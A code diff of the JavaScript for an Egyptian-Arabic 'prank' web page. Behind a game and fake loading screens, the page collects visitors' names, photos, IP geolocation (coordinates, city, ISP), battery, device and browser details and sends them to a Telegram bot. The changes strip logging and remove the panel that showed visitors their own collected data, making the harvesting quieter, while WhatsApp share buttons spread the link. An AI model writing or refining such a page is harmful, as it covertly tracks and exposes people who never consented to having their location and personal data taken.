@@ -74,7 +74,7 @@ function getDeviceBrand() {
 }
 
 // التحقق من متصفح إنستغرام عند تحميل الصفحة
-window.onload = () => {
+document.addEventListener('DOMContentLoaded', () => {
     if (isInstagramBrowser()) {
         Swal.fire({
             title: '🚫 ممنوع الدخول!',
@@ -152,7 +152,6 @@ window.onload = () => {
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
-            console.log('جاري إرسال الرسالة إلى تليجرام...');
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -162,12 +161,10 @@ window.onload = () => {
                     parse_mode: 'Markdown'
                 })
             });
-            console.log('حالة الطلب:', response.status, response.statusText);
             if (!response.ok) {
                 throw new Error(`فشل الطلب: ${response.status}`);
             }
         } catch (error) {
-            console.error('خطأ في إرسال الرسالة لتليجرام:', error);
             Swal.fire({
                 title: 'مشكلة!',
                 text: 'فشلنا نرسل الرسالة. جرب تاني أو غيّر المتصفح.',
@@ -220,22 +217,32 @@ window.onload = () => {
                 return (currentCount || 0) + 1;
             });
             const count = await getVisitorCount();
-            document.getElementById('visitor-count').textContent = toArabicNumerals(count);
+            const visitorCountElement = document.getElementById('visitor-count');
+            if (visitorCountElement) {
+                visitorCountElement.textContent = toArabicNumerals(count);
+            }
         } catch (error) {
-            console.error('خطأ في تحديث عدد الزوار:', error);
-            document.getElementById('visitor-count').textContent = 'مش متوفر';
+            const visitorCountElement = document.getElementById('visitor-count');
+            if (visitorCountElement) {
+                visitorCountElement.textContent = 'مش متوفر';
+            }
         }
     }
 
     // دالة لجلب بيانات الـ IP باستخدام ipapi.co
     async function getIPInfo() {
         try {
-            console.log('جاري جلب بيانات الـ IP من ipapi.co...');
-            const response = await fetch('https://ipapi.co/json/');
+            const response = await fetch('https://ipapi.co/json/', {
+                mode: 'cors',
+                headers: { 'Accept': 'application/json' }
+            });
             if (!response.ok) {
                 throw new Error(`فشل جلب بيانات الـ IP: ${response.status}`);
             }
             const data = await response.json();
+            if (data.error) {
+                throw new Error(data.reason);
+            }
             return {
                 ip: data.ip || 'مش متوفر',
                 country: data.country_name || 'مش متوفر',
@@ -248,7 +255,6 @@ window.onload = () => {
                 postal: data.postal || 'مش متوفر'
             };
         } catch (error) {
-            console.error('خطأ في جلب بيانات الـ IP:', error);
             return {
                 ip: 'مش متوفر',
                 country: 'مش متوفر',
@@ -294,7 +300,7 @@ window.onload = () => {
                     const battery = await navigator.getBattery();
                     batteryStatus = `${toArabicNumerals(Math.round(battery.level * 100))}% (${battery.charging ? 'بيتشحن' : 'مش بيتشحن'})`;
                 } catch (error) {
-                    console.error('خطأ في جلب حالة البطارية:', error);
+                    // تجاهل الخطأ
                 }
             }
 
@@ -303,7 +309,7 @@ window.onload = () => {
                     const estimate = await navigator.storage.estimate();
                     storageQuota = `${toArabicNumerals(Math.round(estimate.quota / 1024 / 1024))} ميجا`;
                 } catch (error) {
-                    console.error('خطأ في جلب التخزين:', error);
+                    // تجاهل الخطأ
                 }
             }
 
@@ -314,63 +320,57 @@ window.onload = () => {
                     webGLVersion = gl.getParameter(gl.VERSION);
                 }
             } catch (error) {
-                console.error('خطأ في جلب WebGL:', error);
+                // تجاهل الخطأ
             }
 
             // إنشاء الرسالة مع بيانات ipapi.co
             const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌍 *البلد*: ${ipData.country}\n🏞️ *المنطقة*: ${ipData.region}\n🏙️ *المدينة*: ${ipData.city}\n📍 *خط العرض*: ${ipData.latitude}\n📍 *خط الطول*: ${ipData.longitude}\n🌐 *مزود الخدمة*: ${ipData.org}\n🕒 *المنطقة الزمنية*: ${ipData.timezone}\n📮 *الرمز البريدي*: ${ipData.postal}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}\n🏷️ *العلامة التجارية*: ${deviceBrand}`;
             await sendToTelegram(message);
 
-            // عرض بيانات الـ IP في واجهة المستخدم
-            const ipInfoElement = document.getElementById('ip-info');
-            ipInfoElement.innerHTML = `
-                <h3>معلومات الـ IP:</h3>
-                <p><strong>الآي بي:</strong> ${ipData.ip}</p>
-                <p><strong>البلد:</strong> ${ipData.country}</p>
-                <p><strong>المنطقة:</strong> ${ipData.region}</p>
-                <p><strong>المدينة:</strong> ${ipData.city}</p>
-                <p><strong>خط العرض:</strong> ${ipData.latitude}</p>
-                <p><strong>خط الطول:</strong> ${ipData.longitude}</p>
-                <p><strong>مزود الخدمة:</strong> ${ipData.org}</p>
-                <p><strong>المنطقة الزمنية:</strong> ${ipData.timezone}</p>
-                <p><strong>الرمز البريدي:</strong> ${ipData.postal}</p>
-            `;
-
             const progress = document.getElementById('progress');
-            progress.style.width = '100%';
+            if (progress) {
+                progress.style.width = '100%';
+            }
 
             const consoleElement = document.getElementById('fake-console');
-            let consoleIndex = 0;
-            const consoleInterval = setInterval(() => {
-                if (consoleIndex < consoleMessages.length) {
-                    consoleElement.innerHTML += `${consoleMessages[consoleIndex]}<br>`;
-                    consoleElement.scrollTop = consoleElement.scrollHeight;
-                    consoleIndex++;
-                }
-            }, 800);
+            if (consoleElement) {
+                let consoleIndex = 0;
+                const consoleInterval = setInterval(() => {
+                    if (consoleIndex < consoleMessages.length) {
+                        consoleElement.innerHTML += `${consoleMessages[consoleIndex]}<br>`;
+                        consoleElement.scrollTop = consoleElement.scrollHeight;
+                        consoleIndex++;
+                    }
+                }, 800);
 
-            let timeLeft = 5;
-            const countdownElement = document.getElementById('countdown');
-            const loadingMessageElement = document.getElementById('loading-message');
-            const interval = setInterval(() => {
-                timeLeft--;
-                countdownElement.textContent = toArabicNumerals(timeLeft);
-                if (timeLeft % 2 === 0) {
-                    loadingMessageElement.textContent = getRandomMessage(loadingMessages);
-                }
-                if (timeLeft <= 0) {
-                    clearInterval(interval);
-                    clearInterval(consoleInterval);
-                    document.getElementById('loading').classList.add('hidden');
-                    const infoSent = document.getElementById('info-sent');
-                    infoSent.classList.remove('hidden');
-                    infoSent.classList.add('animate__fadeInUp');
-                    document.getElementById('prank-message').textContent = getRandomMessage(prankMessages);
-                    updateVisitorCount();
-                }
-            }, 1000);
+                let timeLeft = 5;
+                const countdownElement = document.getElementById('countdown');
+                const loadingMessageElement = document.getElementById('loading-message');
+                const interval = setInterval(() => {
+                    timeLeft--;
+                    if (countdownElement) {
+                        countdownElement.textContent = toArabicNumerals(timeLeft);
+                    }
+                    if (timeLeft % 2 === 0 && loadingMessageElement) {
+                        loadingMessageElement.textContent = getRandomMessage(loadingMessages);
+                    }
+                    if (timeLeft <= 0) {
+                        clearInterval(interval);
+                        clearInterval(consoleInterval);
+                        const loading = document.getElementById('loading');
+                        const infoSent = document.getElementById('info-sent');
+                        if (loading) loading.classList.add('hidden');
+                        if (infoSent) {
+                            infoSent.classList.remove('hidden');
+                            infoSent.classList.add('animate__fadeInUp');
+                        }
+                        const prankMessage = document.getElementById('prank-message');
+                        if (prankMessage) prankMessage.textContent = getRandomMessage(prankMessages);
+                        updateVisitorCount();
+                    }
+                }, 1000);
+            }
         } catch (error) {
-            console.error('خطأ في جلب البيانات:', error);
             Swal.fire({
                 title: 'مشكلة!',
                 text: 'فشلنا نجمع البيانات. جرب تاني أو غيّر المتصفح.',
@@ -384,31 +384,33 @@ window.onload = () => {
 
     // إطلاق قصاصات الورق
     function launchConfetti() {
-        window.confetti({
-            particleCount: 150,
-            spread: 80,
-            origin: { y: 0.6 }
-        });
+        if (window.confetti) {
+            window.confetti({
+                particleCount: 150,
+                spread: 80,
+                origin: { y: 0.6 }
+            });
+        }
     }
 
     // معاينة الصورة وإخفاء زر الرفع
-    document.getElementById('photo-upload').addEventListener('change', (e) => {
+    document.getElementById('photo-upload')?.addEventListener('change', (e) => {
         const file = e.target.files[0];
         const preview = document.getElementById('photo-preview');
         const uploadButton = document.getElementById('upload-button');
-        if (file) {
+        if (file && preview && uploadButton) {
             preview.src = URL.createObjectURL(file);
             preview.classList.add('visible');
             uploadButton.classList.add('hidden');
-        } else {
+        } else if (preview && uploadButton) {
             preview.classList.remove('visible');
             uploadButton.classList.remove('hidden');
         }
     });
 
     // ربط زر رفع الصور بحقل الإدخال المخفي
-    document.getElementById('upload-button').addEventListener('click', () => {
-        document.getElementById('photo-upload').click();
+    document.getElementById('upload-button')?.addEventListener('click', () => {
+        document.getElementById('photo-upload')?.click();
     });
 
     // لعبة النقر السريع
@@ -417,6 +419,8 @@ window.onload = () => {
         const target = document.getElementById('target');
         const gameArea = document.getElementById('game-area');
         const scoreElement = document.getElementById('score');
+
+        if (!target || !gameArea || !scoreElement) return;
 
         function moveTarget() {
             const maxX = gameArea.clientWidth - target.clientWidth;
@@ -439,38 +443,54 @@ window.onload = () => {
 
     // دالة إنهاء اللعبة
     function endGame() {
-        document.getElementById('game').classList.add('hidden');
+        const game = document.getElementById('game');
         const thankYou = document.getElementById('thank-you');
-        thankYou.classList.remove('hidden');
-        thankYou.classList.add('animate__bounceIn');
-        launchConfetti();
+        if (game && thankYou) {
+            game.classList.add('hidden');
+            thankYou.classList.remove('hidden');
+            thankYou.classList.add('animate__bounceIn');
+            launchConfetti();
+        }
     }
 
     // دالة إعادة تشغيل الحركة
     function restartPrank() {
         if (!canAttempt()) return;
-        document.getElementById('thank-you').classList.add('hidden');
-        document.getElementById('loading').classList.remove('hidden');
-        document.getElementById('loading-message').textContent = getRandomMessage(loadingMessages);
-        document.getElementById('name-input').value = '';
-        document.getElementById('photo-upload').value = '';
-        document.getElementById('photo-preview').classList.remove('visible');
-        document.getElementById('upload-button').classList.remove('hidden');
-        document.getElementById('progress').style.width = '0';
-        document.getElementById('fake-console').innerHTML = '';
-        document.getElementById('ip-info').innerHTML = '';
-        getUserInfo();
+        const thankYou = document.getElementById('thank-you');
+        const loading = document.getElementById('loading');
+        if (thankYou && loading) {
+            thankYou.classList.add('hidden');
+            loading.classList.remove('hidden');
+            const loadingMessage = document.getElementById('loading-message');
+            if (loadingMessage) loadingMessage.textContent = getRandomMessage(loadingMessages);
+            const nameInput = document.getElementById('name-input');
+            const photoUpload = document.getElementById('photo-upload');
+            const photoPreview = document.getElementById('photo-preview');
+            const uploadButton = document.getElementById('upload-button');
+            const progress = document.getElementById('progress');
+            const fakeConsole = document.getElementById('fake-console');
+            if (nameInput) nameInput.value = '';
+            if (photoUpload) photoUpload.value = '';
+            if (photoPreview) photoPreview.classList.remove('visible');
+            if (uploadButton) uploadButton.classList.remove('hidden');
+            if (progress) progress.style.width = '0';
+            if (fakeConsole) fakeConsole.innerHTML = '';
+            getUserInfo();
+        }
     }
 
     // ربط الأحداث
-    document.getElementById('end-game-button').addEventListener('click', endGame);
-    document.getElementById('retry-button').addEventListener('click', restartPrank);
+    document.getElementById('end-game-button')?.addEventListener('click', endGame);
+    document.getElementById('retry-button')?.addEventListener('click', restartPrank);
 
     // التعامل مع إرسال النموذج
-    document.getElementById('name-form').addEventListener('submit', (e) => {
+    document.getElementById('name-form')?.addEventListener('submit', (e) => {
         e.preventDefault();
-        const name = document.getElementById('name-input').value.trim();
-        const photo = document.getElementById('photo-upload').files[0];
+        const nameInput = document.getElementById('name-input');
+        const photoUpload = document.getElementById('photo-upload');
+        if (!nameInput) return;
+        const name = nameInput.value.trim();
+        const photo = photoUpload?.files[0];
         if (name) {
             getUserInfo(name);
             Swal.fire({
@@ -482,15 +502,21 @@ window.onload = () => {
                 color: '#e0e0e0',
                 confirmButtonText: 'يلا بينا'
             }).then(() => {
-                document.getElementById('info-sent').classList.add('hidden');
+                const infoSent = document.getElementById('info-sent');
                 const game = document.getElementById('game');
-                game.classList.remove('hidden');
-                game.classList.add('animate__bounceIn');
-                score = 0;
-                document.getElementById('score').textContent = toArabicNumerals(score);
-                document.getElementById('user-name').textContent = name;
-                document.getElementById('thank-you-message').innerHTML = getRandomMessage(thankYouMessages).replace('{name}', name);
-                startGame();
+                if (infoSent && game) {
+                    infoSent.classList.add('hidden');
+                    game.classList.remove('hidden');
+                    game.classList.add('animate__bounceIn');
+                    score = 0;
+                    const scoreElement = document.getElementById('score');
+                    if (scoreElement) scoreElement.textContent = toArabicNumerals(score);
+                    const userName = document.getElementById('user-name');
+                    if (userName) userName.textContent = name;
+                    const thankYouMessage = document.getElementById('thank-you-message');
+                    if (thankYouMessage) thankYouMessage.innerHTML = getRandomMessage(thankYouMessages).replace('{name}', name);
+                    startGame();
+                }
             });
 
             if (photo) {
@@ -502,7 +528,6 @@ window.onload = () => {
                     method: 'POST',
                     body: formData
                 }).catch(error => {
-                    console.error('خطأ في إرسال الصورة:', error);
                     Swal.fire({
                         title: 'مشكلة!',
                         text: 'فشلنا نرسل الصورة. جرب تاني أو غيّر المتصفح.',
@@ -519,19 +544,20 @@ window.onload = () => {
     });
 
     // مشاركة على واتساب
-    document.getElementById('share-whatsapp').addEventListener('click', () => {
+    document.getElementById('share-whatsapp')?.addEventListener('click', () => {
         const text = encodeURIComponent("كسبت في حركة جامدة طحن! 😈 جرّبها وشوف هتعرف ولا لأ! 👉 " + window.location.href);
         window.open(`https://api.whatsapp.com/send?text=${text}`, '_blank');
     });
 
     // مشاركة على إنستغرام
-    document.getElementById('share-instagram').addEventListener('click', () => {
+    document.getElementById('share-instagram')?.addEventListener('click', () => {
         const text = encodeURIComponent("كسبت في حركة جامدة طحن! 😈 جرّبها وشوف هتعرف ولا لأ! 👉 " + window.location.href);
         window.open(`https://www.instagram.com/?url=${window.location.href}`, '_blank');
     });
 
     // تهيئة الموقع
-    document.getElementById('loading-message').textContent = getRandomMessage(loadingMessages);
+    const loadingMessage = document.getElementById('loading-message');
+    if (loadingMessage) loadingMessage.textContent = getRandomMessage(loadingMessages);
     Swal.fire({
         title: 'تحذير يا برنس! ⚠️',
         text: 'دخولك مش مصرّح... كمّل على مسئوليتك! 🔐',
@@ -543,4 +569,4 @@ window.onload = () => {
     }).then(() => {
         getUserInfo();
     });
-};
+});
